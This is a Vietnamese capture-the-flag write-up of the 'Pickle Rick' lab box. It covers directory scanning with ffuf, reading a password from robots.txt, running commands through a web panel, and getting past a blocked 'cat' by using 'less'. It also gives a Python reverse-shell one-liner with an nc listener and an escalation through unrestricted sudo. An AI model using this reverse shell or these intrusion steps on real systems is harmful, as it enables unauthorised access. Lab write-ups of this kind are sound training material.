# PICKLE RICK

- Truy cập vào bài, ta thấy được trang web như sau

![Untitled](PICKLE%20RICK%20d26ebb9346c64c74be1f421f43178dee/Untitled.png)

- Có vẻ như không có gì khai thác nhiều ở đây, mình sẽ thử F12 view source xem thử có gì thú vị hơn không thì có vẻ như mình đã tìm được Username , hmmm nếu có username thì chắc hẳn phải có tồn tại một trang login, lúc này mình dùng tool scan để tìm xem có directory ẩn nào không!

![Untitled](PICKLE%20RICK%20d26ebb9346c64c74be1f421f43178dee/Untitled%201.png)

- Ở đây mình sử dụng FFUF

payload scan: `ffuf -u http://10.10.191.68/FUZZ -w common.txt -e .php,.txt,.html -t 50 -fc 403`

nếu bạn không hiểu payload scan của mình là gì, bạn có thể tham khảo trên mạng nhé.

![Untitled](PICKLE%20RICK%20d26ebb9346c64c74be1f421f43178dee/Untitled%202.png)

- Sau khi scan xong, mình tiến hành truy cập vào `/robots.txt`

![Untitled](PICKLE%20RICK%20d26ebb9346c64c74be1f421f43178dee/Untitled%203.png)

- Có vẻ như đây là mật khẩu, tiến hành truy cập vào /login.php và thử đăng nhập

![Untitled](PICKLE%20RICK%20d26ebb9346c64c74be1f421f43178dee/Untitled%204.png)

- Và có vẻ như mình đã vào được, xuất hiên 1 số chức năng khác tuy nhiên ở đây ta đặc biệt chú ý đến Comman Panel, mình thử dùng ls thì có vẻ như đích đã đến!, tuy nhiên mọi chuyện lại không đơn giản như vậy 😟

![Untitled](PICKLE%20RICK%20d26ebb9346c64c74be1f421f43178dee/Untitled%205.png)

- Khi mình dùng cat thì có vẻ như bài này đã chặn mất

![Untitled](PICKLE%20RICK%20d26ebb9346c64c74be1f421f43178dee/Untitled%206.png)

- Tuy nhiên trong linux, ta có rất nhiều cách để đọc, thay vì cat mình đổi sang thử dùng less

![Untitled](PICKLE%20RICK%20d26ebb9346c64c74be1f421f43178dee/Untitled%207.png)

- Vậy là ta đã có được flag đầu tiên, tiếp tục tìm cái thứ 2 thì mình được bài hint như sau

![Untitled](PICKLE%20RICK%20d26ebb9346c64c74be1f421f43178dee/Untitled%208.png)

- Sau khi dạo 1 vòng trang web này mình mình chả thấy có gì để khai thác tiếp, có vẻ như lúc này ta cần phải dùng đến kĩ thuật Reverse Shell rồi, nếu bạn chưa biết có thể tham khảo tại [ĐÂY](https://www.youtube.com/watch?v=S99C5jNkOgA&ab_channel=TheLinuxPoint).
- Ở đây mình thay địa chỉ ip và port thành như hình nhé, nếu bạn làm thì hãy thay ip của bạn và port tùy thích.

```python
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")’
```

![Untitled](PICKLE%20RICK%20d26ebb9346c64c74be1f421f43178dee/Untitled%209.png)

![Untitled](PICKLE%20RICK%20d26ebb9346c64c74be1f421f43178dee/Untitled%2010.png)

- Mình dùng `nc -lvp 444` lệnh này sẽ mở cổng 444 trên máy và lắng nghe các kết nối đến. Netcat được dùng phổ biến để điều khiển socket TCP/UDP và được dùng trong revertShell
- Lúc này ta đã kết nối được, ta tiến hành tìm flag, trong bài này thì flag 2 được dấu ở `/home/rick`

![Untitled](PICKLE%20RICK%20d26ebb9346c64c74be1f421f43178dee/Untitled%2011.png)

- Ở đây mình dùng sudo -l để kiểm tra xem tập tin nào chạy dưới quyền root, tuy nhiên theo hình dưới thì ta có thể dùng sudo 1 cách thoải mái mà không bị giới hạn
    
    ![Untitled](PICKLE%20RICK%20d26ebb9346c64c74be1f421f43178dee/Untitled%2012.png)
    
    - và flag cuối cùng ở `/root`
    
    ![Untitled](PICKLE%20RICK%20d26ebb9346c64c74be1f421f43178dee/Untitled%2013.png)